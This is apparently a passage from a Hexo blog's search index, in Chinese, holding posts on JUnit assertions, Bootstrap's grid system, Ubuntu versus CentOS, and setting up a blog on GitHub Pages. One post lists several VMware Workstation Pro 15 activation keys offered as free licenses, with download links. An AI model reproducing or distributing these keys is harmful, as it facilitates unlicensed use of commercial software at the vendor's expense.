= {1, 2, 3};    int[] arithmetic2 = {1, 2, 3};    assertEquals(obj1, obj2);    assertSame(obj3, obj4);    assertNotSame(obj2, obj4);    assertNotNull(obj1);    assertNull(obj5);    assertTrue(&quot;为真&quot;, var1 == var2);    assertArrayEquals(arithmetic1, arithmetic2);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> JAVA </tag>
            
            <tag> JUint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap之网格系统</title>
      <link href="2018/04/03/bootstrap-zhi-wang-ge-xi-tong/"/>
      <url>2018/04/03/bootstrap-zhi-wang-ge-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="Bootstrap网格系统"><a href="#Bootstrap网格系统" class="headerlink" title="Bootstrap网格系统"></a>Bootstrap网格系统</h1><p><strong>Bootstrap 提供了一套响应式、移动设备优先的流式网格系统，随着屏幕或视口（viewport）尺寸的增加，系统会自分为最多12列。</strong></p><hr><h1 id="什么是网格（Grid）？"><a href="#什么是网格（Grid）？" class="headerlink" title="什么是网格（Grid）？"></a>什么是网格（Grid）？</h1><p>摘自维基百科：</p><blockquote><p>在平面设计中，网格是一种由一系列用于组织内容的相交的直线（垂直的、水平的）组成的结构（通常是二维的）。它广泛应用于打印设计中的设计布局和内容结构。在网页设计中，它是一种用于快速创建一致的布局和有效地使用 HTML 和 CSS 的方法。</p></blockquote><p>简单地说，网页设计中的网格用于组织内容，让网站易于浏览，并降低用户端的负载。</p><hr><h1 id="什么是-Bootstrap-网格系统（Grid-System）？"><a href="#什么是-Bootstrap-网格系统（Grid-System）？" class="headerlink" title="什么是 Bootstrap 网格系统（Grid System）？"></a>什么是 Bootstrap 网格系统（Grid System）？</h1><blockquote><p>Bootstrap 包含了一个响应式的、移动设备优先的、不固定的网格系统，可以随着设备或视口大小的增加而适当地扩展到 12 列。它包含了用于简单的布局选项的预定义类，也包含了用于生成更多语义布局的功能强大的混合类。</p></blockquote><p>让我们来理解一下上面的语句。Bootstrap 3 是移动设备优先的，在这个意义上，Bootstrap 代码从小屏幕设备（比如移动设备、平板电脑）开始，然后扩展到大屏幕设备（比如笔记本电脑、台式电脑）上的组件和网格。</p><h3 id="移动设备优先策略"><a href="#移动设备优先策略" class="headerlink" title="移动设备优先策略"></a>移动设备优先策略</h3><ul><li>内容<ul><li>决定什么是最重要的。</li></ul></li><li>布局<ul><li>优先设计更小的宽度。</li><li>基础的 CSS 是移动设备优先，媒体查询是针对于平板电脑、台式电脑。</li></ul></li><li>渐进式增强<ul><li>随着屏幕大小的增加而添加元素。</li></ul></li></ul><p>响应式网格系统随着屏幕或视口（viewport）尺寸的增加，系统会自动分为最多12列。</p><table><thead><tr><th>name</th><th>价格</th><th>数量</th><th>name</th><th>价格</th><th>数量</th><th>name</th><th>价格</th><th>数量</th><th>name</th><th>价格</th><th>数量</th></tr></thead><tbody><tr><td>香蕉</td><td>$1</td><td>5</td><td>香蕉</td><td>$1</td><td>5</td><td>香蕉</td><td>$1</td><td>5</td><td>香蕉</td><td>$1</td><td>5</td></tr><tr><td>苹果</td><td>$1</td><td>6</td><td>苹果</td><td>$1</td><td>6</td><td>苹果</td><td>$1</td><td>6</td><td>苹果</td><td>$1</td><td>6</td></tr><tr><td>草莓</td><td>$1</td><td>7</td><td>草莓</td><td>$1</td><td>7</td><td>草莓</td><td>$1</td><td>7</td><td>草莓</td><td>$1</td><td>7</td></tr></tbody></table><h1 id="Bootstrap-网格系统（Grid-System）的工作原理"><a href="#Bootstrap-网格系统（Grid-System）的工作原理" class="headerlink" title="Bootstrap 网格系统（Grid System）的工作原理"></a>Bootstrap 网格系统（Grid System）的工作原理</h1><p>网格系统通过一系列包含内容的行和列来创建页面布局。下面列出了 Bootstrap 网格系统是如何工作的：</p><pre><code>- 行必须放置在 .container class 内，以便获得适当的对齐（alignment）和内边距（padding）。- 使用行来创建列的水平组。- 内容应该放置在列内，且唯有列可以是行的直接子元素。- 预定义的网格类，比如 .row 和 .col-xs-4，可用于快速创建网格布局。LESS 混合类可用于更多语义布局。- 列通过内边距（padding）来创建列内容之间的间隙。该内边距是通过 .rows 上的外边距（margin）取负，表示第一列和最后一列的行偏移。- 网格系统是通过指定您想要横跨的十二个可用的列来创建的。例如，要创建三个相等的列，则使用三个 .col-xs-4。</code></pre><h1 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h1><p>媒体查询是非常别致的”有条件的 CSS3 规则”。它只适用于一些基于某些规定条件的 CSS。如果满足那些条件，则应用相应的样式。</p><p>Bootstrap 中的媒体查询允许您基于视口大小移动、显示并隐藏内容。下面的媒体查询在 LESS 文件中使用，用来创建 Bootstrap 网格系统中的关键的分界点阈值。</p><blockquote><p> /<em> 超小设备（手机，小于 768px） </em>/<br>    /<em> Bootstrap 中默认情况下没有媒体查询 </em>/<br> /<em> 小型设备（平板电脑，768px 起） </em>/<br>@media (min-width: @screen-sm-min) { … }<br> /<em> 中型设备（台式电脑，992px 起） </em>/<br>@media (min-width: @screen-md-min) { … }<br> /<em> 大型设备（大台式电脑，1200px 起） </em>/<br>@media (min-width: @screen-lg-min) { … }<br>我们有时候也会在媒体查询代码中包含 max-width，从而将 CSS 的影响限制在更小范围的屏幕大小之内。<br>      @media (max-width: @screen-xs-max) { … }<br>      @media (min-width: @screen-sm-min) and (max-width: @screen-sm-max) { … }<br>      @media (min-width: @screen-md-min) and (max-width: @screen-md-max) { … }<br>      @media (min-width: @screen-lg-min) { … }<br>媒体查询有两个部分，先是一个设备规范，然后是一个大小规则。在上面的案例中，设置了下列的规则：<br>让我们来看下面这行代码：</p></blockquote><pre><code>@media (min-width: @screen-sm-min) and (max-width: @screen-sm-max) { ... }</code></pre><p>对于所有带有 min-width: @screen-sm-min 的设备，如果屏幕的宽度小于 @screen-sm-max，则会进行一些处理。</p><h1 id="网格选项"><a href="#网格选项" class="headerlink" title="网格选项"></a>网格选项</h1><p>下表总结了 Bootstrap 网格系统如何跨多个设备工作：</p><pre><code>超小设备手机（&lt;768px）    小型设备平板电脑（≥768px）    中型设备台式电脑（≥992px）    大型设备台式电脑（≥1200px）</code></pre><table><thead><tr><th>超小设备手机（&lt;768px）</th><th>小型设备平板电脑（≥768px）</th><th>中型设备台式电脑（≥992px）</th><th>大型设备台式电脑（≥1200px）</th></tr></thead><tbody><tr><td>网格行为</td><td>一直是水平的</td><td>以折叠开始，断点以上是水平的</td><td>以折叠开始，断点以上是水平的</td></tr><tr><td>最大容器宽度</td><td>None (auto)</td><td>750px</td><td>970px</td></tr><tr><td>Class 前缀</td><td>.col-xs-</td><td>.col-sm-</td><td>.col-md-</td></tr><tr><td>列数量和</td><td>12</td><td>12</td><td>12</td></tr><tr><td>最大列宽</td><td>Auto</td><td>60px</td><td>78px</td></tr><tr><td>间隙宽度</td><td>30px（一个列的每边分别 15px）</td><td>30px（一个列的每边分别 15px）</td><td>30px（一个列的每边分别 15px）</td></tr><tr><td>可嵌套</td><td>Yes</td><td>Yes</td><td>Yes</td></tr><tr><td>偏移量</td><td>Yes</td><td>Yes</td><td>Yes</td></tr><tr><td>列排序</td><td>Yes</td><td>Yes</td><td>Yes</td></tr></tbody></table><h1 id="基本的网格结构"><a href="#基本的网格结构" class="headerlink" title="基本的网格结构"></a>基本的网格结构</h1><p>下面是 Bootstrap 网格的基本结构：</p><pre><code> &lt;div style=&quot;border: 1px&quot; class=&quot;container&quot;&gt;    &lt;div class=&quot;row&quot;&gt;        &lt;div class=&quot;col-md-4 col-xs-4&quot; style=&quot;border: 1px red solid&quot;&gt;左&lt;/div&gt;        &lt;div class=&quot;col-md-4 col-xs-4&quot; style=&quot;border: 1px red solid&quot;&gt;右&lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;row&quot;&gt;        &lt;div class=&quot;col-md-6&quot; style=&quot;border: 1px yellow solid&quot;&gt;左&lt;/div&gt;        &lt;div class=&quot;col-md-6&quot; style=&quot;border: 1px yellow solid&quot;&gt;右&lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><p>让我们来看几个简单的网格实例：</p><ul><li>实例：堆叠的水平</li></ul><ul><li><p>实例：中型和大型设备</p></li><li><p>实例：手机、平板电脑、台式电脑</p></li></ul><h1 id="响应式的列重置"><a href="#响应式的列重置" class="headerlink" title="响应式的列重置"></a>响应式的列重置</h1><p>以下实例包含了4个网格，但是我们在小设备浏览时无法确定网格显示的位置。</p><p>为了解决这个问题，可以使用 .clearfix class和 响应式实用工具来解决，如下面实例所示：</p><pre><code>&lt;div class=&quot;container&quot;&gt;&lt;div class=&quot;row&quot; &gt;    &lt;div class=&quot;col-xs-6 col-sm-3&quot;         style=&quot;background-color: #dedef8;        box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit.&lt;/p&gt;    &lt;/div&gt;    &lt;div class=&quot;col-xs-6 col-sm-3&quot;     style=&quot;background-color: #dedef8;box-shadow:     inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do         eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut         enim ad minim veniam, quis nostrud exercitation ullamco laboris         nisi ut aliquip ex ea commodo consequat.        &lt;/p&gt;        &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do         eiusmod tempor incididunt ut.         &lt;/p&gt;    &lt;/div&gt;    &lt;div class=&quot;clearfix visible-xs&quot;&gt;&lt;/div&gt;    &lt;div class=&quot;col-xs-6 col-sm-3&quot;     style=&quot;background-color: #dedef8;    box-shadow:inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        &lt;p&gt;Ut enim ad minim veniam, quis nostrud exercitation ullamco         laboris nisi ut aliquip ex ea commodo consequat.         &lt;/p&gt;    &lt;/div&gt;    &lt;div class=&quot;col-xs-6 col-sm-3&quot;     style=&quot;background-color: #dedef8;box-shadow:     inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do         eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut         enim ad minim         &lt;/p&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><h4 id="请看一下效果："><a href="#请看一下效果：" class="headerlink" title="请看一下效果："></a>请看一下效果：</h4><p>电脑端案例：浏览器上调整窗口大小查看变化，或在您手机上查看效果。<br><img src="https://i.imgur.com/EYrjm6F.png" alt> </p><p><img src="https://i.imgur.com/CpZF2sM.png" alt></p><h1 id="偏移列"><a href="#偏移列" class="headerlink" title="偏移列"></a>偏移列</h1><p>偏移是一个用于更专业的布局的有用功能。它们可用来给列腾出更多的空间。例如，.col-xs-* 类不支持偏移，但是它们可以简单地通过使用一个空的单元格来实现该效果。</p><p>为了在大屏幕显示器上使用偏移，请使用 <code>.col-md-offset-*</code> 类。这些类会把一个列的左外边距（margin）增加 <em> 列，其中 </em> 范围是从 1 到 11。</p><p>在下面的实例中，我们有 <div class="col-md-6">..</div>，我们将使用 <code>.col-md-offset-3 class</code> 来居中这个 div。</p><pre><code>&lt;div class=&quot;container&quot;&gt;&lt;h1&gt;Hello, Bootstrap!&lt;/h1&gt;&lt;div class=&quot;row&quot; &gt;    &lt;div class=&quot;col-md-6 col-md-offset-3&quot;         style=&quot;background-color: #dedef8;box-shadow:     inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing            elit.        &lt;/p&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><p>结果如下：<br><img src="https://i.imgur.com/Ibr4UGL.png" alt></p><h1 id="嵌套列"><a href="#嵌套列" class="headerlink" title="嵌套列"></a>嵌套列</h1><p>为了在内容中嵌套默认的网格，请添加一个新的 <strong>.row</strong>，并在一个已有的 <strong>.col-md-*</strong> 列内添加一组 <strong>.col-md-*</strong> 列。被嵌套的行应包含一组列，这组列个数不能超过12（其实，没有要求你必须占满12列）。</p><p>在下面的实例中，布局有两个列，第二列被分为两行四个盒子。</p><div class="container">   <h1>Hello, world!</h1>   <div class="row"><pre><code>  &lt;div class=&quot;col-md-3&quot; style=&quot;background-color: #dedef8;box-shadow:      inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;     &lt;h4&gt;第一列&lt;/h4&gt;     &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit.&lt;/p&gt;  &lt;/div&gt;  &lt;div class=&quot;col-md-9&quot; style=&quot;background-color: #dedef8;box-shadow:      inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;     &lt;h4&gt;第二列 - 分为四个盒子&lt;/h4&gt;     &lt;div class=&quot;row&quot;&gt;        &lt;div class=&quot;col-md-6&quot; style=&quot;background-color: #B18904;           box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;           &lt;p&gt;Consectetur art party Tonx culpa semiotics. Pinterest               assumenda minim organic quis.           &lt;/p&gt;        &lt;/div&gt;        &lt;div class=&quot;col-md-6&quot; style=&quot;background-color: #B18904;           box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;           &lt;p&gt; sed do eiusmod tempor incididunt ut labore et dolore magna               aliqua. Ut enim ad minim veniam, quis nostrud exercitation               ullamco laboris nisi ut aliquip ex ea commodo consequat.           &lt;/p&gt;        &lt;/div&gt;     &lt;/div&gt;     &lt;div class=&quot;row&quot;&gt;        &lt;div class=&quot;col-md-6&quot; style=&quot;background-color: #B18904;           box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;           &lt;p&gt;quis nostrud exercitation ullamco laboris nisi ut               aliquip ex ea commodo consequat.           &lt;/p&gt;        &lt;/div&gt;           &lt;div class=&quot;col-md-6&quot; style=&quot;background-color: #B18904;           box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;           &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit,               sed do eiusmod tempor incididunt ut labore et dolore magna               aliqua. Ut enim ad minim.&lt;/p&gt;        &lt;/div&gt;     &lt;/div&gt;  &lt;/div&gt;</code></pre>   </div></div>**运行效果：**![](https://i.imgur.com/qi2aEBu.png)<p>注：CSS3 box-shadow 属性向 div 元素添加阴影：<a href="https://www.runoob.com/cssref/css3-pr-box-shadow.html" title="CSS3 box-shadow 属性" target="_blank" rel="noopener">https://www.runoob.com/cssref/css3-pr-box-shadow.html</a></p><h1 id="列排序"><a href="#列排序" class="headerlink" title="列排序"></a>列排序</h1><p>Bootstrap 网格系统另一个完美的特性，就是您可以很容易地以一种顺序编写列，然后以另一种顺序显示列。</p><p>您可以很轻易地改变带有 <code>.col-md-push-*</code> 和 <code>.col-md-pull-*</code> 类的内置网格列的顺序，其中 * 范围是从 1 到 11。</p><p>在下面的实例中，我们有两列布局，左列很窄，作为侧边栏。我们将使用 <code>.col-md-push-*</code>和 <code>.col-md-pull-*</code> 类来互换这两列的顺序</p><pre><code>&lt;div class=&quot;row&quot;&gt;    &lt;p&gt;排序前&lt;/p&gt;    &lt;div class=&quot;col-md-4&quot; style=&quot;background-color: #dedef8;     box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        我在左边    &lt;/div&gt;    &lt;div class=&quot;col-md-8&quot; style=&quot;background-color: #dedef8;     box-shadow: inset 1px -1px 1px #444, inset -1px 1px 1px #444;&quot;&gt;        我在右边    &lt;/div&gt;&lt;/div&gt;&lt;br&gt; &lt;div class=&quot;row&quot;&gt;    &lt;p&gt;排序后&lt;/p&gt;    &lt;div class=&quot;col-md-4 col-md-push-8&quot;         style=&quot;background-color: #dedef8;     box-shadow: inset 1px -1px 1px #444,     inset -1px 1px 1px #444;&quot;&gt;        我在左边    &lt;/div&gt;    &lt;div class=&quot;col-md-8 col-md-pull-4&quot;         style=&quot;background-color: #dedef8;     box-shadow: inset 1px -1px 1px #444,     inset -1px 1px 1px #444;&quot;&gt;        我在右边    &lt;/div&gt;&lt;/div&gt;</code></pre><p>演示结果：<img src="https://i.imgur.com/IJwU12i.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bootstrap </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware Workstation Pro 15下载</title>
      <link href="2018/03/18/vmware-workstation-pro-15-xia-zai/"/>
      <url>2018/03/18/vmware-workstation-pro-15-xia-zai/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows平台最强虚拟机软件已经更新到了VM15-版本了，VMware-Workstation-Pro-15-全面进行了改造重新制作了UI界面及LOGO图标，VMware-Workstation-允许操作系统和应用程序在一台虚拟机内部运行。"><a href="#Windows平台最强虚拟机软件已经更新到了VM15-版本了，VMware-Workstation-Pro-15-全面进行了改造重新制作了UI界面及LOGO图标，VMware-Workstation-允许操作系统和应用程序在一台虚拟机内部运行。" class="headerlink" title="Windows平台最强虚拟机软件已经更新到了VM15 版本了，VMware Workstation Pro 15 全面进行了改造重新制作了UI界面及LOGO图标，VMware Workstation 允许操作系统和应用程序在一台虚拟机内部运行。"></a>Windows平台最强虚拟机软件已经更新到了VM15 版本了，VMware Workstation Pro 15 全面进行了改造重新制作了UI界面及LOGO图标，VMware Workstation 允许操作系统和应用程序在一台虚拟机内部运行。</h1><h2 id="虚拟机是独立运行主机操作系统的离散环境。在-VMware-Workstation-中，你可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。"><a href="#虚拟机是独立运行主机操作系统的离散环境。在-VMware-Workstation-中，你可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。" class="headerlink" title="虚拟机是独立运行主机操作系统的离散环境。在 VMware Workstation 中，你可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。"></a>虚拟机是独立运行主机操作系统的离散环境。在 VMware Workstation 中，你可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。</h2><h2 id="你可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。"><a href="#你可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。" class="headerlink" title="你可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。"></a>你可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。</h2><p><img src="https://i.imgur.com/S0b5hyj.png" alt></p><p><img src="https://i.imgur.com/FHp061U.png" alt></p><p><em><em> 激活密钥许可证VMware Workstation Pro 15 </em></em></p><p><em>激活许可证</em></p><p>UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA</p><p>VF750-4MX5Q-488DQ-9WZE9-ZY2D6</p><p>UU54R-FVD91-488PP-7NNGC-ZFAX6</p><p>YC74H-FGF92-081VZ-R5QNG-P6RY4</p><p>YC34H-6WWDK-085MQ-JYPNX-NZRA2</p><p><strong>下载地址VMware Workstation Pro 15.5.0 Build 14665864</strong></p><p><em><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.0-14665864.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.0-14665864.exe</a></em></p><p><em>VMware Workstation Pro 15.1.0 Build 13591040<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe</a></em></p><p><em>VMware Workstation Pro 14.1.3 Build 9474260<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-14.1.3-9474260.exe</a></em><br><em>VMware Workstation Pro 12.5.9 Build 7535481<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-12.5.9-7535481.exe</a></em></p><p><em>VMware Workstation 10.0.7 Build 2844087<br><a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-10.0.7-2844087.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-10.0.7-2844087.exe</a></em></p><h2 id="黑苹果链接（感谢论坛友人分享）"><a href="#黑苹果链接（感谢论坛友人分享）" class="headerlink" title="黑苹果链接（感谢论坛友人分享）"></a>黑苹果链接（感谢论坛友人分享）</h2><p>链接：<a href="https://pan.baidu.com/s/1ZouLWPk2QGdAapwrWjuz_Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1ZouLWPk2QGdAapwrWjuz_Q</a><br>提取码：xxmn </p>]]></content>
      
      
      <categories>
          
          <category> 资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu与centos的区别</title>
      <link href="2018/03/16/ubuntu-yu-centos-de-qu-bie/"/>
      <url>2018/03/16/ubuntu-yu-centos-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu与centos的区别"><a href="#ubuntu与centos的区别" class="headerlink" title="ubuntu与centos的区别"></a>ubuntu与centos的区别</h1><p><strong>共同点</strong></p><p>1.两个系统都分别有桌面系统与服务器系统，不过ubuntu的桌面从外观上来看要比centos的漂亮<br><img src="https://i.imgur.com/wG2Wijz.png" alt></p><p><strong>不同点</strong></p><p>1.centos中新建的普通用户是没有sudo权限的，如果想让普通用户拥有sudo权限需要在/etc/sudoers文件中添加用户的权限，而ubuntu系统普通用户想要使用sudo权限  直接使用sudo +命令行的方式就可以了<br><img src="https://i.imgur.com/F9j1bQf.png" alt><br><img src="https://i.imgur.com/gO8IHXy.png" alt></p><p>2.安装软件包命令格式不一样。centos使用yum的方式，而Ubuntu使用apt-get 方式。<br><img src="https://i.imgur.com/5HVsSwb.png" alt></p><p>3.由于centos是基于redhat的，所以centos支持rpm包，但Ubuntu不支持。<br><img src="https://i.imgur.com/ncFb1r6.png" alt></p><p>4.现在虽然说ubuntu系统也可以使用服务器端来进行使用了，但相对centos来说并没有centos稳定。而且在一些比较知名的技术论坛大多都是关于centos的，所以在遇到问题查询资料的时候相对要比ubuntu要更方便一些。如下图中centos中文站技术论坛，是很多学习者经常查询问题的地方。<br><img src="https://i.imgur.com/dZWrs2n.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ubuntu </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git page搭建个人博客教程</title>
      <link href="2018/03/11/hexo-github-1/"/>
      <url>2018/03/11/hexo-github-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有任何问题请联系我扣扣：1260842695，vx：szhll5201314，24小时随时在线哦<br>如果觉得有用的话可以看心情打赏一杯奶茶，我会很开心哒。</p></blockquote><h3 id="我的博客源代码地址"><a href="#我的博客源代码地址" class="headerlink" title="我的博客源代码地址"></a>我的博客源代码地址</h3><p>大家可以直接素质二连，star&amp;fork我的博客源代码：<a href="https://github.com/leblog" target="_blank" rel="noopener">https://github.com/leblog</a><br>然后改改配置就可以写文章啦。</p><p>首先将所有文件下载到本地。<br>解压node_modules.zip，然后删除node_modules.zip和.git文件夹。<br>还缺一个字体（为图片添加水印需要用到），去C:\Windows\Fonts下找到STSong Regular，复制到hexo-matery-modified文件夹下。</p><h3 id="快速搭建"><a href="#快速搭建" class="headerlink" title="快速搭建"></a>快速搭建</h3><p>如果你不想自己从头开始慢慢自定义主题的话，可以直接下载我的修改好的主题，然后稍微修改几个地方就好了：</p><p>根目录配置文件_config.yml和主题目录配置文件_config.yml中修改个人信息。<br>根目录配置文件中修改deploy一栏的repository。<br>根目录配置文件中修改baidu_url_submit一栏的token。<br>主题配置文件中修改gitalk一栏，修改方法见正文。<br>当然前提是个性化设置章节之前的环境还是需要配置好！</p><p>平时常用命令：</p><pre>    <code>hexo g  # 生成博客网页文件hexo s  # 本地预览博客hexo d  # 上传网页文件到github    </code></pre><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>17年9月的时候开始搭建了第一个自己的独立博客，到现在也稍微像模像样了。很多小伙伴应该也想过搭建一个自己的博客，网上也有一堆详细教程。我在此稍稍总结一下具体的搭建步骤，另外网上很少有修改博客源码的个性化教程，我就稍稍分享一下我的一些修改经验，更多的个性化操作需要你自己以后去摸索。</p><p>具体效果可以参观我的博客：<b>leblog.github.io</b>，欢迎大家支持。</p><p>我不是一个前端程序员，有些东西不是很了解，写的有问题或有改进的地方请大家指出。</p><p>首先要了解一下我们搭建博客要用到的框架。Hexo是高效的静态站点生成框架，它基于Node.js。通过Hexo，你可以直接使用Markdown语法来撰写博客。相信很多小伙伴写工程都写过README.md文件吧，对，就是这个格式的！写完后只需两三条命令即可将生成的网页上传到你的github上，然后别人就可以看到你的网页啦。是不是很简单？你无需关心网页源代码的具体细节，你只需要用心写好你的博客内容就行。</p><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><hr><ul><li>安装Node.js</li><li>添加国内镜像源</li><li>安装Git</li><li>注册Github账号</li><li>安装Hexo</li><li>连接Github与本地</li><li>写文章、发布文章</li></ul><h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><p>首先下载稳定版<a>Node.js</a>，我这里给的是64位的。</p><p>安装选项全部默认，一路点击Next。</p><p>最后安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，那么就安装成功了。</p><p>添加国内镜像源<br>如果没有梯子的话，可以使用阿里的国内镜像进行加速。</p><pre>    <code>npm config set registry https://registry.npm.taobao.org    </code></pre><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git[下载地址]。</p><p>安装选项还是全部默认，只不过最后一步添加路径时选择Use Git from the Windows Command Prompt，这样我们就可以直接在命令提示符里打开git了。</p><p>安装完成后在命令提示符中输入git –version验证是否安装成功</p><p>注册Github账号<br>接下来就去注册一个github账号，用来存放我们的网站。大多数小伙伴应该都有了吧，作为一个合格的程序猿（媛）还是要有一个的。</p><p>打开<a href="https://github.com/，新建一个项目，如下所示：" target="_blank" rel="noopener">https://github.com/，新建一个项目，如下所示：</a></p><p><img src="2.png" alt><br>然后如下图所示，输入自己的项目名字，后面一定要加.github.io后缀，README初始化也要勾上。名称一定要和你的github名字完全一样，比如你github名字叫abc，那么仓库名字一定要是abc.github.io<br><img src="3.png" alt><br>然后项目就建成了，点击Settings，向下拉到最后有个GitHub Pages，点击Choose a theme选择一个主题。然后等一会儿，再回到GitHub Pages，会变成下面这样：<br><img src="4.png" alt><br>然后完成。</p><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>在合适的地方新建一个文件夹，用来存放自己的博客文件，比如我的博客文件都存放在D:\study\program\blog目录下。</p><p>在该目录下右键点击Git Bash Here，打开git的控制台窗口，以后我们所有的操作都在git控制台进行，就不要用Windows自带的控制台了。</p><p>定位到该目录下，输入npm i hexo-cli -g安装Hexo。会有几个报错，无视它就行。</p><p>安装完后输入hexo -v验证是否安装成功。</p><p>然后就要初始化我们的网站，输入hexo init初始化文件夹，接着输入npm install安装必备的组件。</p><p>这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，然后浏览器打开<b><a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></b>，就可以看到我们的博客啦，效果如下：<br><img src="5.png" alt></p><p>按ctrl+c关闭本地服务器。</p><p>连接Github与本地服务器<br>首先右键打开git bash，然后输入下面命令：</p><pre>    <code>    git config --global user.name "lebolg"    git config --global user.email "1260842695@qq.com"    </code></pre><p>用户名和邮箱根据你注册github的信息自行修改。<br>然后生成密钥SSH key：</p><pre>    <code>        ssh-keygen -t rsa -C "1260842695@qq.com"    </code></pre><p>打开github，在头像下面点击settings，再点击SSH and GPG keys，新建一个SSH，名字随便。</p><p>git bash中输入</p><pre>    <code>        cat ~/.ssh/id_rsa.pub    </code></pre><p>将输出的内容复制到框中，点击确定保存。</p><p>输入ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，如果如下图所示，出现你的用户名，那就成功了。<br><img src="6.png" alt><br>打开博客根目录下的_config.yml文件，这是博客的配置文件，在这里你可以修改与博客相关的各种信息。</p><p>修改最后一行的配置：</p><pre>    <code>        deploy:          type: git          repository: https://github.com/lebolg/lebolg.github.io          branch: master    </code></pre><p>repository修改为你自己的github项目地址。</p><h3 id="写文章、发布文章"><a href="#写文章、发布文章" class="headerlink" title="写文章、发布文章"></a>写文章、发布文章</h3><p>首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。</p><p>然后输入hexo new post “article 